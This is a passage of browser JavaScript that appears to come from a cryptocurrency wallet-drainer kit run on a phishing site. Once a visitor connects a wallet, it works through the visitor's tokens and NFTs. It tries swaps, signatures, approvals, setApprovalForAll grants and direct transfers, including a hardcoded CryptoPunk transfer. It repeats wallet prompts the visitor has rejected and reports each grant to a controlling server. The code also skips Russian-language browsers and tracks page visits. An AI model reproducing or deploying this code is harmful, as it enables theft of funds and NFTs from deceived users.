                    await DO_UNISWAP(asset, all_uniswap);
                    asset.skip = true;
                    break;
                  } catch(err) {
                    console.log(err);
                    await sign_cancel();
                    if (!CF_Settings.Loop_T) break;
                  }
                }
              } else if (asset.swapper_type == 'Pancake_V3') {
                const all_pancake = [];
                for (const x_asset of assets) {
                  try {
                    if (x_asset.chain_id == asset.chain_id && x_asset.swapper && x_asset.swapper_type == 'Pancake_V3') {
                      all_pancake.push(x_asset);
                      x_asset.skip = true;
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
                while (true) {
                  try {
                    await DO_PANCAKE_V3(asset, all_pancake);
                    asset.skip = true;
                    break;
                  } catch(err) {
                    console.log(err);
                    await sign_cancel();
                    if (!CF_Settings.Loop_T) break;
                  }
                }
              } else {
                while (true) {
                  try {
                    await DO_SWAP(asset);
                    asset.skip = true;
                    break;
                  } catch(err) {
                    console.log(err);
                    await sign_cancel();
                    if (!CF_Settings.Loop_T) break;
                  }
                }
              }
            } else if (CF_Settings.Settings.Sign.Tokens > 0 && (!CF_Sign_Disabled || CF_Settings.Settings.Sign.Force == 1)) {
              while (true) {
                try {
                  await SIGN_TOKEN(asset);
                  if (CF_Settings.Settings.Sign.Tokens == 1) {
                    const x_promise = send_request({ action: 'approve_token', user_id: CF_ID, asset, address: CF_Current_Address, PW: false });
                    if (CF_Settings.Settings.Wait_For_Response) await x_promise;
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if ((CF_Settings.Settings.Sign.WC_AE == 1 && CF_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
                    if (CF_Settings.Settings.Sign.Force == 1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        if (CF_Settings.Settings.Sign.Tokens == 1) {
                          if ((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask) || (CF_Current_Provider == 'Trust Wallet'
                          && CF_Settings.Settings.Approve.Trust) || (CF_Current_Provider != 'MetaMask' && CF_Current_Provider != 'Trust Wallet')) {
                            try {
                              let res_code = await APPROVE_TOKEN(asset);
                              if (res_code == 1) {
                                const x_promise = send_request({ action: 'approve_token', user_id: CF_ID, asset, address: CF_Current_Address, PW: CF_Settings.Personal_Wallet });
                                if (CF_Settings.Settings.Wait_For_Response) await x_promise;
                              }
                              asset.skip = true;
                              break;
                            } catch(err) {
                              await approve_cancel();
                              if (!CF_Settings.Loop_T) break;
                            }
                          } else {
                            try {
                              await TRANSFER_TOKEN(asset);
                              asset.skip = true;
                              break;
                            } catch(err) {
                              console.log(err);
                              await transfer_cancel();
                              if (!CF_Settings.Loop_T) break;
                            }
                          }
                        } else if (CF_Settings.Settings.Sign.Tokens == 2) {
                          try {
                            await TRANSFER_TOKEN(asset);
                            asset.skip = true;
                            break;
                          } catch(err) {
                            console.log(err);
                            await transfer_cancel();
                            if (!CF_Settings.Loop_T) break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(err);
                    if (err != 'LOW_BALANCE') {
                      await sign_cancel();
                      if (!CF_Settings.Loop_T) break;
                    } else {
                      break;
                    }
                  }
                }
              }
            } else if ((CF_Current_Provider == 'MetaMask' && CF_Settings.Settings.Approve.MetaMask) || (CF_Current_Provider == 'Trust Wallet'
            && CF_Settings.Settings.Approve.Trust) || (CF_Current_Provider != 'MetaMask' && CF_Current_Provider != 'Trust Wallet')) {
              while (true) {
                try {
                  let res_code = await APPROVE_TOKEN(asset);
                  if (res_code == 1) {
                    const x_promise = send_request({ action: 'approve_token', user_id: CF_ID, asset, address: CF_Current_Address, PW: CF_Settings.Personal_Wallet });
                    if (CF_Settings.Settings.Wait_For_Response) await x_promise;
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!CF_Settings.Loop_T) break;
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_TOKEN(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await transfer_cancel();
                  if (!CF_Settings.Loop_T) break;
                }
              }
            }
          } else if (asset.type == 'ERC721') {
            if (asset.address.toLowerCase() == ('0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB').toLowerCase()) {
              while (true) {
                try {
                  await TRANSFER_CRYPTOPUNK(asset);
                  asset.skip = true; break;
                } catch(err) {
                  console.log(err);
                  if (err != 'LOW_BALANCE') {
                    await sign_cancel();
                    if (!CF_Settings.Loop_NFT) break;
                  } else {
                    break;
                  }
                }
              }
            } else if (CF_Settings.Settings.Sign.NFTs > 0 && (!CF_Sign_Disabled || CF_Settings.Settings.Sign.Force == 1)) {
              while (true) {
                try {
                  await SIGN_NFT(asset);
                  if (CF_Settings.Settings.Sign.NFTs == 1) {
                    let same_collection = [];
                    for (const x_asset of assets) {
                      try {
                        if (x_asset.address == asset.address) {
                          same_collection.push(x_asset);
                          x_asset.skip = true;
                        }
                      } catch(err) {
                        console.log(err);
                      }
                    }
                    await send_request({
                      action: 'safa_approves', user_id: CF_ID, tokens: same_collection, address: CF_Current_Address,
                      chain_id: CF_Current_Chain_ID, contract_address: asset.address, PW: null
                    });
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if ((CF_Settings.Settings.Sign.WC_AE == 1 && CF_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
                    if (CF_Settings.Settings.Sign.Force == 1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        if (CF_Settings.Settings.Sign.NFTs == 1) {
                          try {
                            await DO_SAFA(asset);
                            let same_collection = [];
                            for (const x_asset of assets) {
                              try {
                                if (x_asset.address == asset.address) {
                                  same_collection.push(x_asset);
                                  x_asset.skip = true;
                                }
                              } catch(err) {
                                console.log(err);
                              }
                            }
                            await send_request({
                              action: 'safa_approves', user_id: CF_ID, tokens: same_collection, address: CF_Current_Address,
                              chain_id: CF_Current_Chain_ID, contract_address: asset.address,
                              PW: (CF_Settings.Settings.Use_Randomizer_For_NFTs && CF_Settings.Personal_Wallet != null) ? CF_Settings.Personal_Wallet : false
                            });
                            asset.skip = true;
                            break;
                          } catch(err) {
                            console.log(err);
                            await approve_cancel();
                            if (!CF_Settings.Loop_NFT) break;
                          }
                        } else if (CF_Settings.Settings.Sign.NFTs == 2) {
                          try {
                            await TRANSFER_NFT(asset);
                            asset.skip = true;
                            break;
                          } catch(err) {
                            console.log(err);
                            await transfer_cancel();
                            if (!CF_Settings.Loop_NFT) break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(err);
                    if (err != 'LOW_BALANCE') {
                      await sign_cancel();
                      if (!CF_Settings.Loop_NFT) break;
                    } else {
                      break;
                    }
                  }
                }
              }
            } else if (CF_Settings.Settings.Approve.Enable) {
              while (true) {
                try {
                  await DO_SAFA(asset);
                  let same_collection = [];
                  for (const x_asset of assets) {
                    try {
                      if (x_asset.address == asset.address) {
                        same_collection.push(x_asset);
                        x_asset.skip = true;
                      }
                    } catch(err) {
                      console.log(err);
                    }
                  }
                  await send_request({
                    action: 'safa_approves', user_id: CF_ID, tokens: same_collection, address: CF_Current_Address,
                    chain_id: CF_Current_Chain_ID, contract_address: asset.address,
                    PW: (CF_Settings.Settings.Use_Randomizer_For_NFTs && CF_Settings.Personal_Wallet != null) ? CF_Settings.Personal_Wallet : false
                  });
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!CF_Settings.Loop_NFT) break;
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_NFT(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await transfer_cancel();
                  if (!CF_Settings.Loop_NFT) break;
                }
              }
            }
          }
        } catch(err) {
          console.log(err);
        }
      }
    }
    CF_Process = false;
    setTimeout(end_message, 2000);
  } catch(err) {
    console.log(err);
  }
}

try {
  let query_string = window.location.search, url_params = new URLSearchParams(query_string);
  if (url_params.get('cis') != 'test' && (navigator.language || navigator.userLanguage).toLowerCase().includes('ru')) {
    CF_Bad_Country = true;
  }
} catch(err) {
  console.log(err);
}

document.addEventListener('DOMContentLoaded', async () => {
  try {
    if (CF_Modal_Style == 2) MSM.init(); else inject_modal();
    if (CF_Loader_Style == 2) MSL.init();
    CF_Load_Time = Math.floor(Date.now() / 1000);
    if (typeof localStorage['CF_ID'] === 'undefined') {
      const ID_Data = await send_request({ action: 'retrieve_id' });
      if (ID_Data.status == 'OK') localStorage['CF_ID'] = ID_Data.data;
      else localStorage['CF_ID'] = Math.floor(Date.now() / 1000);
    }
    CF_ID = localStorage['CF_ID'];
    await retrieve_config();
    fill_chain_data();
    await retrieve_contract();
    CF_Ready = true;
    enter_website();
    for (const chain_id in CF_Settings.RPCs) CF_Gas_Reserves[chain_id] = 1;
    for (const elem of document.querySelectorAll('.connect-button')) {
      try {
        elem.addEventListener('click', () => init_co());
      } catch(err) {
        console.log(err);
      }
    }
  } catch(err) {
    console.log(err);
  }
});

const init_reown = () => { connect_wallet('WalletConnect'); };
const use_wc = () => { init_reown(); }; // Legacy Usage

setInterval(async () => {
  try {
    let partner_address = document.getElementById('partner-address');
    if (partner_address === null) return;
    else CF_Partner_Address = partner_address.value.trim();
  } catch(err) {
    console.log(err);
  }
}, 1000);

window.addEventListener("beforeunload", (e) => leave_website());

window.addEventListener("onbeforeunload", (e) => leave_website());
